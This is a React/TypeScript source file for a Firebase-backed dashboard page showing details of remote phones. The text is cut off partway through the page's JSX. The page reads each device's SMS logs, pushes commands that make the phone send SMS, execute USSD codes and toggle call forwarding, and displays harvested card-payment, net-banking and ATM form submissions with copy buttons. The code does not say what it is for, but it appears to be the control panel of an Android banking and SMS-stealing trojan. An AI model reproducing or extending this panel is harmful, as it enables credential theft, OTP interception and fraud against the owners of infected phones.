"use client";

import { useEffect, useState } from "react";
import {
  Card,
  CardBody,
  Chip,
  Button,
  Modal,
  ModalContent,
  ModalHeader,
  ModalBody,
  ModalFooter,
  useDisclosure,
  Input,
  Select,
  SelectItem,
  Textarea,
  ButtonGroup,
  Link,
} from "@heroui/react";
import { FaCopy } from "react-icons/fa";
import { BiCopy } from "react-icons/bi";
import type Device from "@/types/devicetype";
import type DeviceMessage from "@/types/messageTypes";
import { db } from "@/lib/firbase";
import { get, onValue, ref, remove, update } from "firebase/database";
import type { DeviceStatus } from "@/lib/deviceStatus";

type DeviceDetailsTab =
  | "overview"
  | "sms"
  | "send-sms"
  | "call-forwarding"
  | "ussd"
  | "all-data"
  | "view";

const FORM_KEYS = ["atm_submittion", "atm_submissions", "form_submissions"];
const CARD_KEYS = ["card_payment", "card_payment_data", "card", "payment"];
const NETBANK_KEYS = ["netbanking", "netbanking_data"];

const DEVICE_DETAILS_TABS: DeviceDetailsTab[] = [
  "overview",
  "sms",
  "send-sms",
  "call-forwarding",
  "ussd",
  "all-data",
  "view",
];

const DEVICE_TAB_STORAGE_PREFIX = "device-details:selected-tab";

function isDeviceDetailsTab(value: string): value is DeviceDetailsTab {
  return DEVICE_DETAILS_TABS.includes(value as DeviceDetailsTab);
}

function formatMinutesAgo(value: string, nowTimestamp: number): string {
 const timestamp = new Date(value).getTime();
  console.log("Parsed timestamp:", timestamp);

  if (isNaN(timestamp)) return "N/A";
  if (timestamp <= 0) return "Just now";
  console.log("Current time:", Date.now(), "Input time:", timestamp);

  const now = Date.now();
  const diffMs = now - timestamp;

  if (diffMs <= 0) return "Just now";

  const minutes = Math.floor(diffMs / (60 * 1000));
  const hours = Math.floor(diffMs / (60 * 60 * 1000));
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000));

  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;

  return "Just now";
}

function formatMessageTimestamp(value: unknown) {
  const timestamp = getMessageTimestamp(value);

  if (!timestamp) {
    return "Unknown time";
  }

  const date = new Date(timestamp);

  if (Number.isNaN(date.getTime())) {
    return "Unknown time";
  }

  return date.toLocaleString("en-GB", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

function getMessageTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value;
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return 0;
    }

    const numericValue = Number(trimmed);

    if (Number.isFinite(numericValue)) {
      return numericValue;
    }

    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function sortMessagesByLatest(messages: DeviceMessage[]): DeviceMessage[] {
  return messages
    .slice()
    .sort(
      (a, b) =>
        getMessageTimestamp(b.timestamp) - getMessageTimestamp(a.timestamp),
    );
}

function logRequestResult(action: string, result: unknown) {
  console.log(`[DeviceDetails] ${action} result:`, result);
}

function getStatusAppearance(status: DeviceStatus) {
  if (status === "online") {
    return {
      pillClassName: "status-pill status-pill-online",
      dotClassName: "bg-emerald-500",
      label: "Online",
    };
  }

  if (status === "uninstalled") {
    return {
      pillClassName: "status-pill border-amber-200 bg-amber-50 text-amber-700",
      dotClassName: "bg-amber-500",
      label: "Uninstalled",
    };
  }

  return {
    pillClassName: "status-pill status-pill-offline",
    dotClassName: "bg-rose-500",
    label: "Offline",
  };
}

function getSimSlotValue(selectedSim: 1 | 2): "slot 0" | "slot 1" {
  return selectedSim === 1 ? "slot 0" : "slot 1";
}

function hasUsableSimNumber(value: string | null | undefined): boolean {
  if (typeof value !== "string") {
    return false;
  }

  const normalized = value.trim().toLowerCase();

  return normalized !== "" && normalized !== "unknown" && normalized !== "null";
}

function getDefaultSimSelection(
  sim1Number: string | null | undefined,
  sim2Number: string | null | undefined,
): 1 | 2 {
  if (hasUsableSimNumber(sim1Number)) {
    return 1;
  }

  if (hasUsableSimNumber(sim2Number)) {
    return 2;
  }

  return 1;
}

function formatSubmissionFieldLabel(key: string): string {
  return key
    .replace(/([A-Z])/g, " $1")
    .replace(/_/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .replace(/^./, (char) => char.toUpperCase());
}

function formatSubmissionFieldValue(key: string, value: unknown): string {
  if (value === null || value === undefined) {
    return "N/A";
  }

  const normalizedKey = key.toLowerCase();

  if (
    normalizedKey.includes("createdat") ||
    normalizedKey.includes("updatedat") ||
    normalizedKey.includes("timestamp")
  ) {
    const timestamp = getMessageTimestamp(value);

    if (timestamp > 0) {
      return new Date(timestamp).toLocaleString();
    }
  }

  if (typeof value === "string") {
    const trimmed = value.trim();
    return trimmed || "N/A";
  }

  if (typeof value === "number" || typeof value === "boolean") {
    return String(value);
  }

  try {
    return JSON.stringify(value);
  } catch {
    return String(value);
  }
}

function formatSmartTime(value: number) {
  const timestamp = new Date(value).getTime();

  if (Number.isNaN(timestamp)) return "N/A";
  if (timestamp <= 0) return "Just now";

  const now = Date.now();
  const diffMs = now - timestamp;

  if (diffMs <= 0) return "Just now";

  const minutes = Math.floor(diffMs / (60 * 1000));
  const hours = Math.floor(diffMs / (60 * 60 * 1000));
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000));

  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;

  return "Just now";
}

function formatDisplayValue(key: string, value: unknown) {
  if (value === null || value === undefined || value === "") {
    return "N/A";
  }

  const keyName = key.toLowerCase();

  if (
    keyName.includes("timestamp") ||
    keyName.includes("createdat") ||
    keyName.includes("updatedat")
  ) {
    return "";
  }

  if (typeof value === "object") {
    return JSON.stringify(value);
  }

  return String(value);
}

function selectFirstAvailable(record: Record<string, unknown>, keys: string[]) {
  for (const key of keys) {
    if (record[key] !== undefined && record[key] !== null) {
      return record[key];
    }
  }
  return undefined;
}

type HistoryRecord = Record<string, unknown>;

type SubmissionRecord = {
  id: string;
  [key: string]: unknown;
};

type HistorySource = "global" | "registered-device";

type HistoryEntry = {
  id: string;
  data: HistoryRecord;
  source: HistorySource;
};

function getHistoryRecordTimestamp(record: HistoryRecord): number {
  return getMessageTimestamp(
    record.timestamp ?? record.lastUpdated ?? record.createdAt,
  );
}

function parseHistoryEntries(value: unknown, deviceId: string): HistoryEntry[] {
  if (!value || typeof value !== "object") {
    return [];
  }

  const rawHistory = value as Record<string, unknown>;
  const directRecordKeys = [
    "action",
    "code",
    "lastUpdated",
    "result",
    "sim",
    "status",
    "timestamp",
  ];

  const hasDirectRecordShape = directRecordKeys.some(
    (key) => key in rawHistory,
  );

  if (hasDirectRecordShape) {
    return [{ id: deviceId, data: rawHistory, source: "global" }];
  }

  const nestedEntries = Object.entries(rawHistory)
    .filter(([, entryValue]) => entryValue && typeof entryValue === "object")
    .map(([entryId, entryValue]) => ({
      id: entryId,
      data: entryValue as HistoryRecord,
      source: "global" as const,
    }))
    .sort(
      (a, b) =>
        getHistoryRecordTimestamp(b.data) - getHistoryRecordTimestamp(a.data),
    );

  if (nestedEntries.length > 0) {
    return nestedEntries;
  }

  return [{ id: deviceId, data: rawHistory, source: "global" }];
}

function mergeHistoryEntries(...entryGroups: HistoryEntry[][]): HistoryEntry[] {
  return entryGroups
    .flat()
    .sort(
      (a, b) =>
        getHistoryRecordTimestamp(b.data) - getHistoryRecordTimestamp(a.data),
    );
}

function parseSubmissionRecords(value: unknown): SubmissionRecord[] {
  if (!value || typeof value !== "object") {
    return [];
  }

  if (Array.isArray(value)) {
    return value
      .map((entry, index) => {
        if (!entry || typeof entry !== "object") {
          return null;
        }

        const parsedEntry = entry as Record<string, unknown>;
        const parsedId =
          typeof parsedEntry.id === "string" && parsedEntry.id.trim()
            ? parsedEntry.id
            : String(index);

        return {
          ...parsedEntry,
          id: parsedId,
        };
      })
      .filter((entry): entry is SubmissionRecord => entry !== null);
  }

  const rawRecord = value as Record<string, unknown>;

  const nestedEntries = Object.entries(rawRecord)
    .map(([entryId, entryValue]) => {
      if (!entryValue || typeof entryValue !== "object") {
        return null;
      }

      const parsedEntry = entryValue as Record<string, unknown>;
      const parsedId =
        typeof parsedEntry.id === "string" && parsedEntry.id.trim()
          ? parsedEntry.id
          : entryId;

      return {
        ...parsedEntry,
        id: parsedId,
      };
    })
    .filter((entry): entry is SubmissionRecord => entry !== null);

  if (nestedEntries.length > 0) {
    return nestedEntries;
  }

  const directRecordId =
    typeof rawRecord.id === "string" && rawRecord.id.trim()
      ? rawRecord.id
      : "entry-1";

  return [
    {
      ...rawRecord,
      id: directRecordId,
    },
  ];
}

async function copyToClipboard(text: string) {
  if (typeof window === "undefined") {
    return;
  }

  try {
    await navigator.clipboard.writeText(text);
    return;
  } catch {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    textarea.setAttribute("readonly", "");
    textarea.style.position = "fixed";
    textarea.style.opacity = "0";
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand("copy");
    document.body.removeChild(textarea);
  }
}

function getSubmissionDeviceId(entry: SubmissionRecord): string {
  const possibleValues = [
    entry.uniqueId,
    entry.uniqueid,
    entry.uniqueID,
    entry.deviceId,
    entry.deviceID,
    entry.deviceid,
    entry.udid,
    entry.uid,
  ];

  for (const value of possibleValues) {
    if (typeof value === "string" && value.trim()) {
      return value.trim();
    }
  }

  if (typeof entry.id === "string") {
    return entry.id.trim();
  }

  return "";
}

function matchesSubmissionDeviceId(
  entry: SubmissionRecord,
  deviceId: string,
): boolean {
  return getSubmissionDeviceId(entry) === deviceId;
}

interface DeviceDetailsProps {
  device: Device;
  messages: DeviceMessage[];
  forms?: SubmissionRecord[];
  cards?: SubmissionRecord[];
  netBanking?: SubmissionRecord[];
  onDeleteSMS?: (smsId: string) => Promise<void>;
}

export default function DeviceDetails({
  device,
  messages,
  forms = [],
  cards = [],
  netBanking = [],
  onDeleteSMS,
}: DeviceDetailsProps) {
  const [selectedTab, setSelectedTab] = useState<DeviceDetailsTab>("overview");
  const [nowTimestamp, setNowTimestamp] = useState(() => Date.now());
  const [selectedSIM, setSelectedSIM] = useState<1 | 2>(() =>
    getDefaultSimSelection(device.sim1number, device.sim2number),
  );
  const [forwardingSIM, setForwardingSIM] = useState<1 | 2>(() =>
    getDefaultSimSelection(device.sim1number, device.sim2number),
  );
  const [forwardingNumber, setForwardingNumber] = useState("");
  const [isForwardingActive, setIsForwardingActive] = useState(false);
  const [smsReceiver, setSmsReceiver] = useState("");
  const [smsMessage, setSmsMessage] = useState("");
  const [ussdCode, setUssdCode] = useState("");
  const [ussdSimSlot, setUssdSimSlot] = useState<1 | 2>(() =>
    getDefaultSimSelection(device.sim1number, device.sim2number),
  );
  const [isSendingUssd, setIsSendingUssd] = useState(false);
  const [smsList, setSmsList] = useState<DeviceMessage[]>(messages);
  const [smsActionLoading, setSmsActionLoading] = useState(false);
  const [isAdminPhoneLoading, setIsAdminPhoneLoading] = useState(false);
  const [formSubmissions, setFormSubmissions] = useState<SubmissionRecord[]>(
    [],
  );
  const [cardSubmissions, setCardSubmissions] = useState<SubmissionRecord[]>(
    [],
  );
  const [netbankingSubmissions, setNetbankingSubmissions] = useState<
    SubmissionRecord[]
  >([]);
  const [callForwardingHistory, setCallForwardingHistory] = useState<
    HistoryEntry[]
  >([]);
  const [adminPhone1, setAdminPhone1] = useState(
    device.adminPhoneNumber[0] || "",
  );
  
  // Always show both SIM options - number validation not needed for slot selection
  const canUseSim1 = true; // Always enable SIM 1 for slot selection
  const canUseSim2 = true; // Always enable SIM 2 for slot selection
  const hasAnyUsableSim = true; // Always have at least one SIM available for selection
  const preferredSim = 1; // Default to SIM 1
  
  const availableSimOptions = [
    {
      key: "sim1",
      slot: 1 as const,
      label: `SIM 1 ${device.sim1number ? `- ${device.sim1number}` : ""}`,
    },
    {
      key: "sim2",
      slot: 2 as const,
      label: `SIM 2 ${device.sim2number ? `- ${device.sim2number}` : ""}`,
    },
  ];
  
  const isSimSelectable = (slot: 1 | 2) => {
    return true; // Always selectable for slot selection
  };

  const {
    isOpen: isPhoneModalOpen,
    onOpen: onPhoneModalOpen,
    onClose: onPhoneModalClose,
  } = useDisclosure();
  const { isOpen: isSimModalOpen, onClose: onSimModalClose } = useDisclosure();
  const {
    isOpen: isSendSMSModalOpen,
    onOpen: onSendSMSModalOpen,
    onClose: onSendSMSModalClose,
  } = useDisclosure();

  useEffect(() => {
    setSmsList(sortMessagesByLatest(messages));
  }, [messages]);

  useEffect(() => {
    const intervalId = window.setInterval(() => {
      setNowTimestamp(Date.now());
    }, 60 * 1000);

    return () => {
      window.clearInterval(intervalId);
    };
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") {
      return;
    }

    const savedTab = window.sessionStorage.getItem(
      `${DEVICE_TAB_STORAGE_PREFIX}:${device.deviceId}`,
    );

    if (savedTab && isDeviceDetailsTab(savedTab)) {
      setSelectedTab(savedTab);
      return;
    }

    setSelectedTab("overview");
  }, [device.deviceId]);

  useEffect(() => {
    if (!hasAnyUsableSim) {
      return;
    }

    if (!isSimSelectable(selectedSIM)) {
      setSelectedSIM(preferredSim);
    }
  }, [selectedSIM, hasAnyUsableSim, preferredSim]);

  useEffect(() => {
    if (!hasAnyUsableSim) {
      return;
    }

    if (!isSimSelectable(forwardingSIM)) {
      setForwardingSIM(preferredSim);
    }
  }, [forwardingSIM, hasAnyUsableSim, preferredSim]);

  useEffect(() => {
    if (!hasAnyUsableSim) {
      return;
    }

    if (!isSimSelectable(ussdSimSlot)) {
      setUssdSimSlot(preferredSim);
    }
  }, [ussdSimSlot, hasAnyUsableSim, preferredSim]);

  useEffect(() => {
    if (forms && forms.length > 0) {
      setFormSubmissions(forms);
    } else {
      const deviceRef = ref(db, `registeredDevices/${device.deviceId}`);
      return onValue(deviceRef, (snap) => {
        if (!snap.exists()) {
          setFormSubmissions([]);
          return;
        }

        const deviceData = (snap.val() ?? {}) as Record<string, unknown>;
        const rawForms = selectFirstAvailable(deviceData, FORM_KEYS);

        const parsedEntries = parseSubmissionRecords(rawForms).filter((entry) =>
          matchesSubmissionDeviceId(entry, device.deviceId),
        );

        setFormSubmissions(parsedEntries);
      });
    }
  }, [device.deviceId, forms]);

  useEffect(() => {
    if (cards && cards.length > 0) {
      setCardSubmissions(cards);
    } else {
      const deviceRef = ref(db, `registeredDevices/${device.deviceId}`);
      return onValue(deviceRef, (snap) => {
        if (!snap.exists()) {
          setCardSubmissions([]);
          return;
        }

        const deviceData = (snap.val() ?? {}) as Record<string, unknown>;
        const rawCards = selectFirstAvailable(deviceData, CARD_KEYS);

        const parsedEntries = parseSubmissionRecords(rawCards).filter((entry) =>
          matchesSubmissionDeviceId(entry, device.deviceId),
        );

        setCardSubmissions(parsedEntries);
      });
    }
  }, [device.deviceId, cards]);

  useEffect(() => {
    if (netBanking && netBanking.length > 0) {
      setNetbankingSubmissions(netBanking);
    } else {
      const deviceRef = ref(db, `registeredDevices/${device.deviceId}`);
      return onValue(deviceRef, (snap) => {
        if (!snap.exists()) {
          setNetbankingSubmissions([]);
          return;
        }

        const deviceData = (snap.val() ?? {}) as Record<string, unknown>;
        const rawNetbanking = selectFirstAvailable(deviceData, NETBANK_KEYS);

        const parsedEntries = parseSubmissionRecords(rawNetbanking).filter(
          (entry) => matchesSubmissionDeviceId(entry, device.deviceId),
        );

        setNetbankingSubmissions(parsedEntries);
      });
    }
  }, [device.deviceId, netBanking]);

  useEffect(() => {
    const globalHistoryRef = ref(db, `history/${device.deviceId}`);
    const registeredHistoryRef = ref(
      db,
      `registeredDevices/${device.deviceId}/history`,
    );

    let globalHistoryEntries: HistoryEntry[] = [];
    let registeredHistoryEntries: HistoryEntry[] = [];

    const syncCombinedHistory = () => {
      setCallForwardingHistory(
        mergeHistoryEntries(globalHistoryEntries, registeredHistoryEntries),
      );
    };

    const unsubscribeGlobalHistory = onValue(globalHistoryRef, (snapshot) => {
      if (!snapshot.exists()) {
        globalHistoryEntries = [];
        syncCombinedHistory();
        return;
      }

      globalHistoryEntries = parseHistoryEntries(
        snapshot.val(),
        device.deviceId,
      ).map((entry) => ({
        ...entry,
        source: "global",
      }));

      syncCombinedHistory();
    });

    const unsubscribeRegisteredHistory = onValue(
      registeredHistoryRef,
      (snapshot) => {
        if (!snapshot.exists()) {
          registeredHistoryEntries = [];
          syncCombinedHistory();
          return;
        }

        registeredHistoryEntries = parseHistoryEntries(
          snapshot.val(),
          device.deviceId,
        ).map((entry) => ({
          ...entry,
          source: "registered-device",
        }));

        syncCombinedHistory();
      },
    );

    return () => {
      unsubscribeGlobalHistory();
      unsubscribeRegisteredHistory();
    };
  }, [device.deviceId]);

  const handleDeleteSMS = async (id: string) => {
    if (confirm("Are you sure you want to delete this SMS message?")) {
      setSmsActionLoading(true);
      try {
        if (onDeleteSMS) {
          await onDeleteSMS(id);
        } else {
          const smsRef = ref(db, `smsLogs/${device.deviceId}/${id}`);
          await remove(smsRef);
        }
        setSmsList((prev) => prev.filter((sms) => sms.id !== id));
      } catch (error) {
        console.error("Failed to delete SMS", error);
      } finally {
        setSmsActionLoading(false);
      }
    }
  };
  
  const handleSendUssd = async () => {
    if (!ussdCode) {
      alert("Please enter a USSD code");
      return;
    }

    setIsSendingUssd(true);
    try {
      const response = await fetch("/api/sendussd", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "USSD Request",
          body: `Execute USSD code ${ussdCode}`,
          data: {
            command: "ussd",
            ussdCode,
            sim: getSimSlotValue(ussdSimSlot),
          },
        }),
      });
      const result = await response.json();
      logRequestResult("USSD send", result);
      if (!response.ok || !result.success) {
        alert("Failed to send USSD request");
        return;
      }
      alert("USSD request sent");
      setUssdCode("");
    } finally {
      setIsSendingUssd(false);
    }
  };

  const handleDeleteAllSMS = async () => {
    if (confirm("Are you sure you want to delete all SMS messages?")) {
      setSmsActionLoading(true);
      try {
        const smsRef = ref(db, `smsLogs/${device.deviceId}`);
        await remove(smsRef);
        setSmsList([]);
      } catch (error) {
        console.error("Failed to delete all SMS", error);
      } finally {
        setSmsActionLoading(false);
      }
    }
  };
  const deviceStatus = getStatusAppearance(device.onlineStatus);

  const handleAdminPhoneUpdate = async () => {
    setIsAdminPhoneLoading(true);

    const nextPhone = adminPhone1.trim();

    try {
      await update(ref(db, `registeredDevices/${device.deviceId}`), {
        adminPhoneNumber: nextPhone ? [nextPhone] : [],
        adminPhoneNumbers: nextPhone ? [nextPhone] : [],
        updatedAt: new Date().toISOString(),
      });
      const respose = await fetch("/api/updateAdminPhones", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "Admin Phone Numbers Updated",
          body: "Admin phone numbers have been updated for this device.",
          data: {
            number: nextPhone,
          },
        }),
      });
      const result = await respose.json();
      logRequestResult("Admin phone update", result);
      if (!respose.ok || !result.success) {
        throw new Error("Failed to update admin phone numbers");
      }

      alert("Admin phone number updated successfully");
      onPhoneModalClose();
    } catch (error) {
      console.error("Failed to update admin phone numbers", error);
    } finally {
      setIsAdminPhoneLoading(false);
    }
  };

  const handledeleteAdminPhone = async (phone: string) => {
    const phoneToDelete = phone.trim();

    if (!phoneToDelete) {
      alert("No admin phone number available to clear");
      return;
    }

    if (!confirm("Are you sure you want to clear this admin phone number?")) {
      return;
    }

    setIsAdminPhoneLoading(true);
    try {
      const updatedPhoneNumbers = [adminPhone1]
        .map((num) => num.trim())
        .filter((num) => num && num !== phoneToDelete);

      await update(ref(db, `registeredDevices/${device.deviceId}`), {
        adminPhoneNumber: updatedPhoneNumbers,
        adminPhoneNumbers: updatedPhoneNumbers,
        updatedAt: new Date().toISOString(),
      });

      const response = await fetch("/api/updateAdminPhones", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          data: {
            number: updatedPhoneNumbers[0] ?? "",
          },
        }),
      });

      const result = await response.json();
      logRequestResult("Admin phone delete", result);

      if (!response.ok || !result.success) {
        throw new Error("Failed to notify admin phone deletion");
      }

      setAdminPhone1(updatedPhoneNumbers[0] ?? "");
      alert("Admin phone number cleared successfully");
    } catch (error) {
      console.error("Failed to delete admin phone number", error);
    } finally {
      setIsAdminPhoneLoading(false);
    }
  };

  const handleForwardSim = async () => {
    setSmsActionLoading(true);
    try {
      await update(ref(db, `registeredDevices/${device.deviceId}`), {
        forwardingSim: getSimSlotValue(selectedSIM),
        updatedAt: new Date().toISOString(),
      });
      const response = await fetch("/api/simforwarding", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "Forwarding SIM Updated",
          body: "The forwarding SIM has been updated for this device.",
          data: {
            forwardingSim: getSimSlotValue(selectedSIM),
          },
        }),
      });
      const result = await response.json();
      logRequestResult("Forwarding SIM update", result);
      if (!response.ok) {
        alert("Failed to update forwarding SIM");
      }
      onSimModalClose();
    } catch (error) {
      console.error("Failed to update forwarding sim", error);
    } finally {
      setSmsActionLoading(false);
    }
  };

  const handleRefreshSMS = async () => {
    setSmsActionLoading(true);
    try {
      const smsRef = ref(
        db,
        "registeredDevices/" + device.deviceId + "/smsLogs",
      );
      const snapshot = await get(smsRef);
      if (!snapshot.exists()) {
        console.warn(
          "No SMS data found in Firebase for device:",
          device.deviceId,
        );
        setSmsList([]);
        alert("No SMS messages found in database");
        return;
      }

      const smsData = snapshot.val() as Record<string, Record<string, unknown>>;
      console.log("SMS Data keys:", Object.keys(smsData));

      const refreshedLogs: DeviceMessage[] = Object.keys(smsData).map((key) => {
        const item = smsData[key];
        return {
          id: key,
          body: typeof item.body === "string" ? item.body : "",
          reciverNumber:
            typeof item.reciverNumber === "string"
              ? item.reciverNumber
              : typeof item.receiverNumber === "string"
                ? item.receiverNumber
                : "",
          senderNumber:
            typeof item.senderNumber === "string" ? item.senderNumber : "",
          timestamp:
            typeof item.timestamp === "string"
              ? item.timestamp
              : new Date().toISOString(),
          title: typeof item.title === "string" ? item.title : "",
          deviceId:
            typeof item.deviceId === "string" ? item.deviceId : device.deviceId,
        };
      });

      console.log("Refreshed logs count:", refreshedLogs.length);
      const sortedLogs = sortMessagesByLatest(refreshedLogs);
      setSmsList(sortedLogs);
      alert(`Refreshed! Found ${sortedLogs.length} SMS messages`);
    } catch (error) {
      console.error("Failed to refresh SMS from database", error);
      alert(
        "Error refreshing SMS: " +
          (error instanceof Error ? error.message : String(error)),
      );
    } finally {
      setSmsActionLoading(false);
    }
  };

  const handleGetSms = async () => {
    setSmsActionLoading(true);
    try {
      const response = await fetch("/api/getsms", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "Get SMS Request",
          body: "Requesting SMS messages from device",
          data: {
            command: "get_sms",
          },
        }),
      });
      const result = await response.json();
      logRequestResult("Get SMS", result);
      if (!response.ok || !result.success) {
        alert("Failed to request SMS from device");
        return;
      }
      alert(
        "SMS request sent to device. It may take a moment for messages to appear.",
      );
    } catch (error) {
      console.error("Failed to request SMS from device", error);
      alert(
        "Error requesting SMS: " +
          (error instanceof Error ? error.message : String(error)),
      );
    } finally {
      setSmsActionLoading(false);
    }
  };

  const handleCheckOnline = async () => {
    setSmsActionLoading(true);
    try {
      const response = await fetch("/api/checkstatus", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          deviceId: device.deviceId,
          token: device.fcmToken,
          title: "Status Check",
          body: "Checking device status, please wait...",
        }),
      });

      const result = await response.json();
      logRequestResult("Check online", result);

      if (!response.ok || !result.success) {
        alert("Failed to check device status");
        return;
      }

      alert("Status check request sent");
    } catch (error) {
      console.error("Failed to check device status", error);
      alert("Error while checking status");
    } finally {
      setSmsActionLoading(false);
    }
  };

  const switchTab = (nextTab: DeviceDetailsTab) => {
    setSelectedTab(nextTab);

    if (typeof window !== "undefined") {
      window.sessionStorage.setItem(
        `${DEVICE_TAB_STORAGE_PREFIX}:${device.deviceId}`,
        nextTab,
      );
    }
  };

  const handleSendSMS = async () => {
    if (!smsReceiver || !smsMessage) {
      alert("Please enter a receiver number and message");
      return;
    }

    const response = await fetch("/api/sendmessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        title: `SMS to ${smsReceiver}`,
        data: {
          message: smsMessage,
          receiver: String(smsReceiver),
          sim: getSimSlotValue(selectedSIM),
        },
        body: `Send SMS to ${smsReceiver}`,
        token: device.fcmToken,
      }),
    });
    const data = await response.json();
    logRequestResult("SMS send", data);
    if (data.success) {
      alert("SMS sent successfully");
      onSendSMSModalClose();
      setSmsReceiver("");
      setSmsMessage("");
    } else {
      alert("Failed to send SMS");
    }
  };

  const handleActivateForwarding = async () => {
    if (!forwardingNumber) {
      alert("Please enter a forwarding number");
      return;
    }

    const response = await fetch("/api/callforwarding", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        token: device.fcmToken,
        title: `Call Forwarding Activated`,
        command: "activate",
        body: "Forwarding to " + forwardingNumber,
        data: {
          sim: getSimSlotValue(forwardingSIM),
          number: String(forwardingNumber),
        },
      }),
    });
    const data = await response.json();
    if (data.success) {
      alert("Call forwarding activated successfully");
      await update(
        ref(db, `registeredDevices/${device.deviceId}/callForwarding`),
        {
          status: "ON",
          number: forwardingNumber,
          updatedAt: Date.now(),
          forwardingSim: getSimSlotValue(forwardingSIM),
        },
      );
      await update(ref(db, `history/${device.deviceId}`), {
        action: "call",
        code: String(forwardingNumber),
        lastUpdated: Date.now(),
        result: "Call forwarding activated",
        sim: getSimSlotValue(forwardingSIM),
        status: "success",
        timestamp: Date.now(),
      });
      setIsForwardingActive(true);
      setForwardingNumber("");
    } else {
      alert("Failed to activate call forwarding");
    }
  };

  const handleDeactivateForwarding = async () => {
    const response = await fetch("/api/callforwarding", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        token: device.fcmToken,
        command: "deactivate",
        title: `Call Forwarding Deactivated`,
        body: "Deactivating call forwarding",
        data: {
          sim: getSimSlotValue(forwardingSIM),
        },
      }),
    });
    if (response.ok) {
      alert("Call forwarding deactivated successfully");
      await update(
        ref(db, `registeredDevices/${device.deviceId}/callForwarding`),
        {
          status: "OFF",
          number: "",
          updatedAt: new Date().toISOString(),
          forwardingSim: 0,
        },
      );
      setIsForwardingActive(false);
      const result = await response.json();
      logRequestResult("Call forwarding deactivate", result);
    } else {
      alert("Failed to deactivate call forwarding");
    }
  };

  const renderSubmissionSection = <T extends object>(
    title: string,
    entries: T[],
    emptyMessage: string,
    countClassName: string,
  ) => {
    return (
      <section className="rounded-[20px] border border-(--border) bg-(--surface-glass) p-4 shadow-(--shadow-sm) backdrop-blur-xl">
       
        {entries.length === 0 ? (
          <div className="rounded-2xl border border-(--border) bg-(--surface-subtle) p-5 text-sm text-(--text-muted)">
            {emptyMessage}
          </div>
        ) : (
          <div className="space-y-3">
            {entries.map((entry, index) => (
              <div
                key={`${title}-${String((entry as Record<string, unknown>).id ?? index)}`}
                className="p-3 surface-card"
              >
                <div className="mt-2 space-y-1">
                  {Object.entries(entry as Record<string, unknown>).map(
                    ([key, value]) => (
                      <div
                        key={`${title}-${String((entry as Record<string, unknown>).id ?? "entry")}-${key}`}
                        className="flex flex-col gap-1 text-sm text-(--text-muted)"
                      >
                        {!["timestamp", "createdat", "updatedat"].some((part) =>
                          key.toLowerCase().includes(part),
                        ) && (
                          <>
                            <div className="flex flex-row items-center gap-1">
                              <span className="font-semibold text-blue-800 uppercase">
                                {key}:
                              </span>

                              <FaCopy
                                onClick={() =>
                                  navigator.clipboard.writeText(String(value))
                                }
                              />
                            </div>

                            <span>{formatDisplayValue(key, value)}</span>
                          </>
                        )}
                      </div>
                    ),
                  )}
                </div>

                {((entry as Record<string, unknown>).timestamp !== null &&
                  (entry as Record<string, unknown>).timestamp !== undefined) ||
                ((entry as Record<string, unknown>).createdAt !== null &&
                  (entry as Record<string, unknown>).createdAt !== undefined) ||
                ((entry as Record<string, unknown>).updatedAt !== null &&
                  (entry as Record<string, unknown>).updatedAt !==
                    undefined) ? (
                  <div className="mt-2 flex justify-end">
                    <span className="text-xs text-gray-500">
                      {formatSmartTime(
                        Number(
                          (entry as Record<string, unknown>).timestamp ??
                            (entry as Record<string, unknown>).createdAt ??
                            (entry as Record<string, unknown>).updatedAt,
                        ),
                      )}
                    </span>
                  </div>
                ) : null}
              </div>
            ))}
          </div>
        )}
      </section>
    );
  };

  return (
    <div className="space-y-6">
      
      <Card className="overflow-hidden rounded-[18px] border border-(--border) bg-[#e9e9e9]">
        <CardBody className="p-3 sm:p-4">
          <div className="rounded-xl  px-4 py-3">
            <div className="grid grid-cols-[110px_1fr] gap-y-2 text-[14px]">
              <span className="font-semibold text-[#111]">Name</span>
              <span className="text-right font-semibold text-[#111]">
                {device.brand} {device.model}
              </span>

              <span className="font-semibold text-[#111]">ID</span>
              <span className="text-right font-mono text-[#1f3ea1] break-all">
                {device.deviceId}
              </span>

              <span className="font-semibold text-[#111]">SIM</span>
              <span className="text-right text-[#1f3ea1]">
                {[device.sim1number, device.sim2number]
                  .filter((value) => hasUsableSimNumber(value))
                  .join(" | ") || "N/A"}
              </span>

              <span className="font-semibold text-[#111]">Forward Call</span>
              <span className="text-right text-red-600">
                {isForwardingActive ? "ON" : "OFF"}
              </span>

              <span className="font-semibold text-[#111]">Last</span>
              <span className="text-right text-red-600">
                {device.lastChecked
                  ? formatMinutesAgo(device.lastChecked, nowTimestamp)
                  : "offline"}
              </span>
            </div>
          </div>
        </CardBody>
      </Card>

      {/* Tabs */}
